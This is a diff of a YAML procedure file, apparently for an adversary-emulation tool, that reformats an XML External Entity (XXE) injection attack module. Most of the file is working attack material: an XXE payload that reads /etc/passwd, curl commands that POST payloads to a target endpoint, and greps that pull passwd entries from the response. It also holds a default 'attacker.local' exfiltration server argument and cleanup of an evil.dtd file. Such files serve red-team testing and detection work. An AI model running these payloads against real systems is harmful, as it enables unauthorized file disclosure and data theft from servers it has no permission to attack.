@@ -1,59 +1,50 @@
-name: "018: XXE injection"
-description: "Exploit XML External Entity (XXE) injection to read files and execute code"
-id: "k1l4h6m9-5j8i-1h3m-6k9l-2i0j5h8m3l4k"
-api_version: "2.0"
-platform: darwin
-tags:
-  - initial_access
-  - web_exploitation
-  - xxe_injection
-  - xml_attack
-actors: []
-mitre_attack:
+---
+api_version: 2.0
+uuid: e1f4b6a9-5d8c-4b3e-f6c9-2c0d5b8e3f4a
+name: XXE Injection
+authors:
+  - mbhatt
+description: |
+  Exploit XML External Entity (XXE) injection to read files and execute code.
+  Includes payload creation, endpoint identification, payload delivery, and
+  data extraction.
+
+mitre:
   tactics:
-    - initial_access
+    - "TA0001 Initial Access"
   techniques:
-    - T1190
-procedure_examples: []
-arguments:
-  target_url:
+    - "T1190 Exploit Public-Facing Application"
+
+requirements:
+  platforms:
+    - os: darwin
+
+args:
+  - name: target_url
     description: "Target application URL accepting XML input"
     type: string
-    required: true
     default: "http://vulnerable-app.local/api/xml"
-  xxe_type:
+  - name: xxe_type
     description: "Type of XXE attack (file_read, blind, oob, rce)"
     type: string
-    required: true
     default: "file_read"
-  target_file:
+  - name: target_file
     description: "File to read via XXE (for file_read type)"
     type: string
-    required: true
     default: "/etc/passwd"
-  exfil_server:
+  - name: exfil_server
     description: "Server for out-of-band data exfiltration"
     type: string
-    required: true
     default: "attacker.local"
+
 steps:
-  - name: "Create XXE payload"
-    description: "Generate XXE injection payload"
-    command: |
+  - name: create_xxe_payload
+    description: Generate XXE injection payload
+    inline: |
       echo "[*] Creating XXE injection payload"
       echo "[*] Type: ${xxe_type}"
       case "${xxe_type}" in
         file_read)
-          cat > /tmp/xxe_payload.xml << 'XXE'
-      <?xml version="1.0" encoding="ISO-8859-1"?>
-      <!DOCTYPE foo [
-        <!ELEMENT foo ANY >
-        <!ENTITY xxe SYSTEM "file:///etc/passwd" >
-      ]>
-      <foo>&xxe;</foo>
-      XXE
-          ;;
-        blind)
           cat > /tmp/xxe_payload.xml << 'XXE'
       <?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [
@@ -77,14 +68,21 @@ steps:
           ;;
       esac
       echo "[+] XXE payload created"
-  - name: "Identify XML endpoint"
-    description: "Identify the XML processing endpoint"
-    command: |
+    cleanup:
+      inline: |
+        rm -f /tmp/xxe_payload.xml 2>/dev/null
+        rm -f /tmp/xxe_response.txt 2>/dev/null
+        rm -f /tmp/evil.dtd 2>/dev/null
+
+  - name: identify_xml_endpoint
+    description: Identify the XML processing endpoint
+    inline: |
       echo "[*] Identifying XML processing endpoint"
-      curl -s "${target_url}" | grep -i "xml\|soap\|upload" | head -10
-  - name: "Send XXE payload"
-    description: "Send the XXE payload to the target"
-    command: |
+      curl -s "${target_url}" | grep -i "xml\\|soap\\|upload" | head -10
+
+  - name: send_xxe_payload
+    description: Send the XXE payload to the target
+    inline: |
       echo "[*] Sending XXE payload to ${target_url}"
       curl -s -X POST "${target_url}" \
         -H "Content-Type: application/xml" \
@@ -92,34 +90,23 @@ steps:
         -o /tmp/xxe_response.txt
       echo "[+] Response captured"
       cat /tmp/xxe_response.txt | head -30
-  - name: "Extract data via XXE"
-    description: "Extract sensitive data through XXE vulnerability"
-    command: |
+
+  - name: extract_data_via_xxe
+    description: Extract sensitive data through XXE vulnerability
+    inline: |
       echo "[*] Extracting data via XXE"
       grep -i "root:\\|daemon:\\|bin:" /tmp/xxe_response.txt | head -5
-checks:
-  - name: "XXE payload creation check"
-    description: "Verify XXE payload was created"
-    command: "[ -f /tmp/xxe_payload.xml ] && grep -q 'ENTITY\\|DOCTYPE' /tmp/xxe_payload.xml && echo 'PASS' || echo 'FAIL'"
-  - name: "Response capture check"
-    description: "Verify response was captured"
-    command: "[ -s /tmp/xxe_response.txt ] && echo 'PASS' || echo 'FAIL'"
+
+  - name: xxe_payload_creation_check
+    description: Verify XXE payload was created
+    inline: |
+      [ -f /tmp/xxe_payload.xml ] && grep -q "ENTITY\\|DOCTYPE" /tmp/xxe_payload.xml && echo "PASS" || echo "FAIL"
+
+  - name: response_capture_check
+    description: Verify response was captured
+    inline: |
+      [ -s /tmp/xxe_response.txt ] && echo "PASS" || echo "FAIL"
+
 tests:
-  - name: "xxe_injection_test"
-    description: "Test XXE injection in dry run mode"
+  - name: xxe_injection_test
     dry_run: true
-    command: |
-      echo "[TEST] XXE Injection Test (Dry Run)"
-      echo "[TEST] Target: ${target_url}"
-      echo "[TEST] Type: ${xxe_type}"
-      echo "[TEST] Target file: ${target_file}"
-      echo "[TEST] Would send XXE payload and exfiltrate data"
-cleanup:
-  - name: "Remove XXE artifacts"
-    description: "Clean up XXE testing files"
-    command: |
-      echo "[*] Cleaning up XXE artifacts"
-      rm -f /tmp/xxe_payload.xml 2>/dev/null
-      rm -f /tmp/xxe_response.txt 2>/dev/null
-      rm -f /tmp/evil.dtd 2>/dev/null
-      echo "[+] XXE cleanup complete"
